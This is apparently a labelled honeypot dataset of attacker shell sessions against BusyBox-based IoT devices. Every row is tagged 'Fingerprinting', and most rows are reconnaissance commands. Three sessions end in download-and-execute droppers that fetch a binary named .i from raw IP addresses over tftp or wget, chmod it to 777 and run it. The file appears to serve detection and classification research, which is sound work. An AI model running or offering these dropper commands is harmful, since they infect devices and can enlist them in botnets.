Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
19273;6d62c5c9114d;1,31499E+16;11;shell;Fingerprinting;0;busybox fingerprinting
19274;6d62c5c9114d;1,31499E+16;11;shell;Fingerprinting;0;busybox fingerprinting
19275;6d62c5c9114d;1,31499E+16;11;sh;Fingerprinting;0;busybox fingerprinting
19276;6d62c5c9114d;1,31499E+16;11;/bin/busybox VENUSZUELA;Fingerprinting;0;busybox fingerprinting
19277;6d62c5c9114d;1,31499E+16;11;"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1";Fingerprinting;0;busybox fingerprinting
19278;6d62c5c9114d;1,31499E+16;11;cat /bin/busybox;Fingerprinting;0;busybox fingerprinting
19279;6d62c5c9114d;1,31499E+16;11;while read i;Fingerprinting;0;busybox fingerprinting
19280;6d62c5c9114d;1,31499E+16;11;dd if=/bin/busybox bs=22 count=1;Fingerprinting;0;busybox fingerprinting
18128;996236e523f5;1,31682E+16;11;enable;Fingerprinting;0;busybox fingerprinting
18129;996236e523f5;1,31682E+16;11;system;Fingerprinting;0;busybox fingerprinting
18130;996236e523f5;1,31682E+16;11;system;Fingerprinting;0;busybox fingerprinting
18131;996236e523f5;1,31682E+16;11;shell;Fingerprinting;0;busybox fingerprinting
18132;996236e523f5;1,31682E+16;11;shell;Fingerprinting;0;busybox fingerprinting
18133;996236e523f5;1,31682E+16;11;sh;Fingerprinting;0;busybox fingerprinting
18134;996236e523f5;1,31682E+16;11;/bin/busybox VENUSZUELA;Fingerprinting;0;busybox fingerprinting
18135;996236e523f5;1,31682E+16;11;"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1";Fingerprinting;0;busybox fingerprinting
18136;996236e523f5;1,31682E+16;11;cat /bin/busybox;Fingerprinting;0;busybox fingerprinting
18137;996236e523f5;1,31682E+16;11;while read i;Fingerprinting;0;busybox fingerprinting
18138;996236e523f5;1,31682E+16;11;dd if=/bin/busybox bs=22 count=1;Fingerprinting;0;busybox fingerprinting
18396;fa4732b8bc80;1,31742E+16;11;enable;Fingerprinting;0;busybox fingerprinting
18397;fa4732b8bc80;1,31742E+16;11;system;Fingerprinting;0;busybox fingerprinting
18398;fa4732b8bc80;1,31742E+16;11;system;Fingerprinting;0;busybox fingerprinting
18399;fa4732b8bc80;1,31742E+16;11;shell;Fingerprinting;0;busybox fingerprinting
18400;fa4732b8bc80;1,31742E+16;11;shell;Fingerprinting;0;busybox fingerprinting
18401;fa4732b8bc80;1,31742E+16;11;sh;Fingerprinting;0;busybox fingerprinting
18402;fa4732b8bc80;1,31742E+16;11;/bin/busybox VENUSZUELA;Fingerprinting;0;busybox fingerprinting
18403;fa4732b8bc80;1,31742E+16;11;"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1";Fingerprinting;0;busybox fingerprinting
18404;fa4732b8bc80;1,31742E+16;11;cat /bin/busybox;Fingerprinting;0;busybox fingerprinting
18405;fa4732b8bc80;1,31742E+16;11;while read i;Fingerprinting;0;busybox fingerprinting
18406;fa4732b8bc80;1,31742E+16;11;dd if=/bin/busybox bs=22 count=1;Fingerprinting;0;busybox fingerprinting
18104;a8e98a605368;1,43005E+16;13;enable;Fingerprinting;0;busybox fingerprinting
18105;a8e98a605368;1,43005E+16;13;system;Fingerprinting;0;busybox fingerprinting
18106;a8e98a605368;1,43005E+16;13;system;Fingerprinting;0;busybox fingerprinting
18107;a8e98a605368;1,43005E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18108;a8e98a605368;1,43005E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18109;a8e98a605368;1,43005E+16;13;sh;Fingerprinting;0;busybox fingerprinting
18110;a8e98a605368;1,43005E+16;13;"cat /proc/mounts; /bin/busybox YGIZW";Fingerprinting;0;busybox fingerprinting
18111;a8e98a605368;1,43005E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YGIZW";Fingerprinting;0;busybox fingerprinting
18112;a8e98a605368;1,43005E+16;13;"tftp; wget; /bin/busybox YGIZW";Fingerprinting;0;busybox fingerprinting
18113;a8e98a605368;1,43005E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
18114;a8e98a605368;1,43005E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
18115;a8e98a605368;1,43005E+16;13;/bin/busybox YGIZW;Fingerprinting;0;busybox fingerprinting
18116;a8e98a605368;1,43005E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
1211;2bac30288b22;1,43783E+16;13;enable;Fingerprinting;0;busybox fingerprinting
1212;2bac30288b22;1,43783E+16;13;system;Fingerprinting;0;busybox fingerprinting
1213;2bac30288b22;1,43783E+16;13;system;Fingerprinting;0;busybox fingerprinting
1214;2bac30288b22;1,43783E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1215;2bac30288b22;1,43783E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1216;2bac30288b22;1,43783E+16;13;sh;Fingerprinting;0;busybox fingerprinting
1217;2bac30288b22;1,43783E+16;13;"cat /proc/mounts; /bin/busybox MWIFM";Fingerprinting;0;busybox fingerprinting
1218;2bac30288b22;1,43783E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MWIFM";Fingerprinting;0;busybox fingerprinting
1219;2bac30288b22;1,43783E+16;13;"tftp; wget; /bin/busybox MWIFM";Fingerprinting;0;busybox fingerprinting
1220;2bac30288b22;1,43783E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
1221;2bac30288b22;1,43783E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
1222;2bac30288b22;1,43783E+16;13;/bin/busybox MWIFM;Fingerprinting;0;busybox fingerprinting
1223;2bac30288b22;1,43783E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
24249;4277900fc1b6;1,44509E+16;14;enable;Fingerprinting;0;busybox fingerprinting
24250;4277900fc1b6;1,44509E+16;14;system;Fingerprinting;0;busybox fingerprinting
24251;4277900fc1b6;1,44509E+16;14;system;Fingerprinting;0;busybox fingerprinting
24252;4277900fc1b6;1,44509E+16;14;shell;Fingerprinting;0;busybox fingerprinting
24253;4277900fc1b6;1,44509E+16;14;shell;Fingerprinting;0;busybox fingerprinting
24254;4277900fc1b6;1,44509E+16;14;sh;Fingerprinting;0;busybox fingerprinting
24255;4277900fc1b6;1,44509E+16;14;"cat /proc/mounts; /bin/busybox WLZDM";Fingerprinting;0;busybox fingerprinting
24256;4277900fc1b6;1,44509E+16;14;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WLZDM";Fingerprinting;0;busybox fingerprinting
24257;4277900fc1b6;1,44509E+16;14;"tftp; wget; /bin/busybox WLZDM";Fingerprinting;0;busybox fingerprinting
24258;4277900fc1b6;1,44509E+16;14;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
24259;4277900fc1b6;1,44509E+16;14;while read i;Fingerprinting;0;busybox fingerprinting
24260;4277900fc1b6;1,44509E+16;14;/bin/busybox WLZDM;Fingerprinting;0;busybox fingerprinting
24261;4277900fc1b6;1,44509E+16;14;"rm .s; tftp -l.i -r.i -g 37.113.52.123:38959; chmod 777 .i; ./.i; exit";Fingerprinting;0;busybox fingerprinting
24262;4277900fc1b6;1,44509E+16;14;./.i;Fingerprinting;0;busybox fingerprinting
1467;eaf6d0812143;1,46157E+16;12;enable;Fingerprinting;0;busybox fingerprinting
1468;eaf6d0812143;1,46157E+16;12;system;Fingerprinting;0;busybox fingerprinting
1469;eaf6d0812143;1,46157E+16;12;system;Fingerprinting;0;busybox fingerprinting
1470;eaf6d0812143;1,46157E+16;12;shell;Fingerprinting;0;busybox fingerprinting
1471;eaf6d0812143;1,46157E+16;12;shell;Fingerprinting;0;busybox fingerprinting
1472;eaf6d0812143;1,46157E+16;12;sh;Fingerprinting;0;busybox fingerprinting
1473;eaf6d0812143;1,46157E+16;12;"cat /proc/mounts; /bin/busybox FSDLN";Fingerprinting;0;busybox fingerprinting
1474;eaf6d0812143;1,46157E+16;12;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FSDLN";Fingerprinting;0;busybox fingerprinting
1475;eaf6d0812143;1,46157E+16;12;"tftp; wget; /bin/busybox FSDLN";Fingerprinting;0;busybox fingerprinting
1476;eaf6d0812143;1,46157E+16;12;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
1477;eaf6d0812143;1,46157E+16;12;while read i;Fingerprinting;0;busybox fingerprinting
1478;eaf6d0812143;1,46157E+16;12;/bin/busybox FSDLN;Fingerprinting;0;busybox fingerprinting
1505;0ba9a5c194b2;1,59154E+16;13;enable;Fingerprinting;0;busybox fingerprinting
1506;0ba9a5c194b2;1,59154E+16;13;system;Fingerprinting;0;busybox fingerprinting
1507;0ba9a5c194b2;1,59154E+16;13;system;Fingerprinting;0;busybox fingerprinting
1508;0ba9a5c194b2;1,59154E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1509;0ba9a5c194b2;1,59154E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1510;0ba9a5c194b2;1,59154E+16;13;sh;Fingerprinting;0;busybox fingerprinting
1511;0ba9a5c194b2;1,59154E+16;13;"cat /proc/mounts; /bin/busybox LYKJM";Fingerprinting;0;busybox fingerprinting
1512;0ba9a5c194b2;1,59154E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LYKJM";Fingerprinting;0;busybox fingerprinting
1513;0ba9a5c194b2;1,59154E+16;13;"tftp; wget; /bin/busybox LYKJM";Fingerprinting;0;busybox fingerprinting
1514;0ba9a5c194b2;1,59154E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
1515;0ba9a5c194b2;1,59154E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
1516;0ba9a5c194b2;1,59154E+16;13;/bin/busybox LYKJM;Fingerprinting;0;busybox fingerprinting
1517;0ba9a5c194b2;1,59154E+16;13;"rm .s; wget http://158.140.65.153:37871/.i; chmod 777 .i; ./.i; exit";Fingerprinting;0;busybox fingerprinting
1479;7b4c41825474;1,61568E+16;13;enable;Fingerprinting;0;busybox fingerprinting
1480;7b4c41825474;1,61568E+16;13;system;Fingerprinting;0;busybox fingerprinting
1481;7b4c41825474;1,61568E+16;13;system;Fingerprinting;0;busybox fingerprinting
1482;7b4c41825474;1,61568E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1483;7b4c41825474;1,61568E+16;13;shell;Fingerprinting;0;busybox fingerprinting
1484;7b4c41825474;1,61568E+16;13;sh;Fingerprinting;0;busybox fingerprinting
1485;7b4c41825474;1,61568E+16;13;"cat /proc/mounts; /bin/busybox TLDTB";Fingerprinting;0;busybox fingerprinting
1486;7b4c41825474;1,61568E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TLDTB";Fingerprinting;0;busybox fingerprinting
1487;7b4c41825474;1,61568E+16;13;"tftp; wget; /bin/busybox TLDTB";Fingerprinting;0;busybox fingerprinting
1488;7b4c41825474;1,61568E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
1489;7b4c41825474;1,61568E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
1490;7b4c41825474;1,61568E+16;13;/bin/busybox TLDTB;Fingerprinting;0;busybox fingerprinting
1491;7b4c41825474;1,61568E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
18967;154b208b0b09;1,66834E+16;13;enable;Fingerprinting;0;busybox fingerprinting
18968;154b208b0b09;1,66834E+16;13;system;Fingerprinting;0;busybox fingerprinting
18969;154b208b0b09;1,66834E+16;13;system;Fingerprinting;0;busybox fingerprinting
18970;154b208b0b09;1,66834E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18971;154b208b0b09;1,66834E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18972;154b208b0b09;1,66834E+16;13;sh;Fingerprinting;0;busybox fingerprinting
18973;154b208b0b09;1,66834E+16;13;"cat /proc/mounts; /bin/busybox GRCMR";Fingerprinting;0;busybox fingerprinting
18974;154b208b0b09;1,66834E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GRCMR";Fingerprinting;0;busybox fingerprinting
18975;154b208b0b09;1,66834E+16;13;"tftp; wget; /bin/busybox GRCMR";Fingerprinting;0;busybox fingerprinting
18976;154b208b0b09;1,66834E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
18977;154b208b0b09;1,66834E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
18978;154b208b0b09;1,66834E+16;13;/bin/busybox GRCMR;Fingerprinting;0;busybox fingerprinting
18979;154b208b0b09;1,66834E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
2088;90e7c8122803;1,68567E+16;13;enable;Fingerprinting;0;busybox fingerprinting
2089;90e7c8122803;1,68567E+16;13;system;Fingerprinting;0;busybox fingerprinting
2090;90e7c8122803;1,68567E+16;13;system;Fingerprinting;0;busybox fingerprinting
2091;90e7c8122803;1,68567E+16;13;shell;Fingerprinting;0;busybox fingerprinting
2092;90e7c8122803;1,68567E+16;13;shell;Fingerprinting;0;busybox fingerprinting
2093;90e7c8122803;1,68567E+16;13;sh;Fingerprinting;0;busybox fingerprinting
2094;90e7c8122803;1,68567E+16;13;"cat /proc/mounts; /bin/busybox QIBDO";Fingerprinting;0;busybox fingerprinting
2095;90e7c8122803;1,68567E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QIBDO";Fingerprinting;0;busybox fingerprinting
2096;90e7c8122803;1,68567E+16;13;"tftp; wget; /bin/busybox QIBDO";Fingerprinting;0;busybox fingerprinting
2097;90e7c8122803;1,68567E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
2098;90e7c8122803;1,68567E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
2099;90e7c8122803;1,68567E+16;13;/bin/busybox QIBDO;Fingerprinting;0;busybox fingerprinting
2100;90e7c8122803;1,68567E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
24078;5b74c45348fc;1,72792E+16;14;enable;Fingerprinting;0;busybox fingerprinting
24079;5b74c45348fc;1,72792E+16;14;system;Fingerprinting;0;busybox fingerprinting
24080;5b74c45348fc;1,72792E+16;14;system;Fingerprinting;0;busybox fingerprinting
24081;5b74c45348fc;1,72792E+16;14;shell;Fingerprinting;0;busybox fingerprinting
24082;5b74c45348fc;1,72792E+16;14;shell;Fingerprinting;0;busybox fingerprinting
24083;5b74c45348fc;1,72792E+16;14;sh;Fingerprinting;0;busybox fingerprinting
24084;5b74c45348fc;1,72792E+16;14;"cat /proc/mounts; /bin/busybox DXVAP";Fingerprinting;0;busybox fingerprinting
24085;5b74c45348fc;1,72792E+16;14;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DXVAP";Fingerprinting;0;busybox fingerprinting
24086;5b74c45348fc;1,72792E+16;14;"tftp; wget; /bin/busybox DXVAP";Fingerprinting;0;busybox fingerprinting
24087;5b74c45348fc;1,72792E+16;14;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
24088;5b74c45348fc;1,72792E+16;14;while read i;Fingerprinting;0;busybox fingerprinting
24089;5b74c45348fc;1,72792E+16;14;/bin/busybox DXVAP;Fingerprinting;0;busybox fingerprinting
24090;5b74c45348fc;1,72792E+16;14;"rm .s; tftp -l.i -r.i -g 31.28.249.247:5692; chmod 777 .i; ./.i; exit";Fingerprinting;0;busybox fingerprinting
24091;5b74c45348fc;1,72792E+16;14;./.i;Fingerprinting;0;busybox fingerprinting
20548;403394560421;1,81228E+16;12;enable;Fingerprinting;0;busybox fingerprinting
20549;403394560421;1,81228E+16;12;system;Fingerprinting;0;busybox fingerprinting
20550;403394560421;1,81228E+16;12;system;Fingerprinting;0;busybox fingerprinting
20551;403394560421;1,81228E+16;12;shell;Fingerprinting;0;busybox fingerprinting
20552;403394560421;1,81228E+16;12;shell;Fingerprinting;0;busybox fingerprinting
20553;403394560421;1,81228E+16;12;sh;Fingerprinting;0;busybox fingerprinting
20554;403394560421;1,81228E+16;12;"cat /proc/mounts; /bin/busybox QGXPK";Fingerprinting;0;busybox fingerprinting
20555;403394560421;1,81228E+16;12;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QGXPK";Fingerprinting;0;busybox fingerprinting
20556;403394560421;1,81228E+16;12;"tftp; wget; /bin/busybox QGXPK";Fingerprinting;0;busybox fingerprinting
20557;403394560421;1,81228E+16;12;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
20558;403394560421;1,81228E+16;12;while read i;Fingerprinting;0;busybox fingerprinting
20559;403394560421;1,81228E+16;12;/bin/busybox QGXPK;Fingerprinting;0;busybox fingerprinting
21159;8f4835fffd4b;1,82451E+16;12;enable;Fingerprinting;0;busybox fingerprinting
21160;8f4835fffd4b;1,82451E+16;12;system;Fingerprinting;0;busybox fingerprinting
21161;8f4835fffd4b;1,82451E+16;12;system;Fingerprinting;0;busybox fingerprinting
21162;8f4835fffd4b;1,82451E+16;12;shell;Fingerprinting;0;busybox fingerprinting
21163;8f4835fffd4b;1,82451E+16;12;shell;Fingerprinting;0;busybox fingerprinting
21164;8f4835fffd4b;1,82451E+16;12;sh;Fingerprinting;0;busybox fingerprinting
21165;8f4835fffd4b;1,82451E+16;12;"cat /proc/mounts; /bin/busybox BTUAA";Fingerprinting;0;busybox fingerprinting
21166;8f4835fffd4b;1,82451E+16;12;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BTUAA";Fingerprinting;0;busybox fingerprinting
21167;8f4835fffd4b;1,82451E+16;12;"tftp; wget; /bin/busybox BTUAA";Fingerprinting;0;busybox fingerprinting
21168;8f4835fffd4b;1,82451E+16;12;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
21169;8f4835fffd4b;1,82451E+16;12;while read i;Fingerprinting;0;busybox fingerprinting
21170;8f4835fffd4b;1,82451E+16;12;/bin/busybox BTUAA;Fingerprinting;0;busybox fingerprinting
17511;6adab8198bb9;1,85907E+16;13;enable;Fingerprinting;0;busybox fingerprinting
17512;6adab8198bb9;1,85907E+16;13;system;Fingerprinting;0;busybox fingerprinting
17513;6adab8198bb9;1,85907E+16;13;system;Fingerprinting;0;busybox fingerprinting
17514;6adab8198bb9;1,85907E+16;13;shell;Fingerprinting;0;busybox fingerprinting
17515;6adab8198bb9;1,85907E+16;13;shell;Fingerprinting;0;busybox fingerprinting
17516;6adab8198bb9;1,85907E+16;13;sh;Fingerprinting;0;busybox fingerprinting
17517;6adab8198bb9;1,85907E+16;13;"cat /proc/mounts; /bin/busybox PYEHF";Fingerprinting;0;busybox fingerprinting
17518;6adab8198bb9;1,85907E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PYEHF";Fingerprinting;0;busybox fingerprinting
17519;6adab8198bb9;1,85907E+16;13;"tftp; wget; /bin/busybox PYEHF";Fingerprinting;0;busybox fingerprinting
17520;6adab8198bb9;1,85907E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
17521;6adab8198bb9;1,85907E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
17522;6adab8198bb9;1,85907E+16;13;/bin/busybox PYEHF;Fingerprinting;0;busybox fingerprinting
17523;6adab8198bb9;1,85907E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
18455;1ce093dd0cc2;1,94477E+16;13;enable;Fingerprinting;0;busybox fingerprinting
18456;1ce093dd0cc2;1,94477E+16;13;system;Fingerprinting;0;busybox fingerprinting
18457;1ce093dd0cc2;1,94477E+16;13;system;Fingerprinting;0;busybox fingerprinting
18458;1ce093dd0cc2;1,94477E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18459;1ce093dd0cc2;1,94477E+16;13;shell;Fingerprinting;0;busybox fingerprinting
18460;1ce093dd0cc2;1,94477E+16;13;sh;Fingerprinting;0;busybox fingerprinting
18461;1ce093dd0cc2;1,94477E+16;13;"cat /proc/mounts; /bin/busybox XUDMD";Fingerprinting;0;busybox fingerprinting
18462;1ce093dd0cc2;1,94477E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XUDMD";Fingerprinting;0;busybox fingerprinting
18463;1ce093dd0cc2;1,94477E+16;13;"tftp; wget; /bin/busybox XUDMD";Fingerprinting;0;busybox fingerprinting
18464;1ce093dd0cc2;1,94477E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
18465;1ce093dd0cc2;1,94477E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
18466;1ce093dd0cc2;1,94477E+16;13;/bin/busybox XUDMD;Fingerprinting;0;busybox fingerprinting
18467;1ce093dd0cc2;1,94477E+16;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
2151;c66cc7211936;2,65868E+16;13;enable;Fingerprinting;0;busybox fingerprinting
2152;c66cc7211936;2,65868E+16;13;system;Fingerprinting;0;busybox fingerprinting
2153;c66cc7211936;2,65868E+16;13;system;Fingerprinting;0;busybox fingerprinting
2154;c66cc7211936;2,65868E+16;13;shell;Fingerprinting;0;busybox fingerprinting
2155;c66cc7211936;2,65868E+16;13;shell;Fingerprinting;0;busybox fingerprinting
2156;c66cc7211936;2,65868E+16;13;sh;Fingerprinting;0;busybox fingerprinting
2157;c66cc7211936;2,65868E+16;13;"cat /proc/mounts; /bin/busybox WVIDL";Fingerprinting;0;busybox fingerprinting
2158;c66cc7211936;2,65868E+16;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WVIDL";Fingerprinting;0;busybox fingerprinting
2159;c66cc7211936;2,65868E+16;13;"tftp; wget; /bin/busybox WVIDL";Fingerprinting;0;busybox fingerprinting
2160;c66cc7211936;2,65868E+16;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
2161;c66cc7211936;2,65868E+16;13;while read i;Fingerprinting;0;busybox fingerprinting
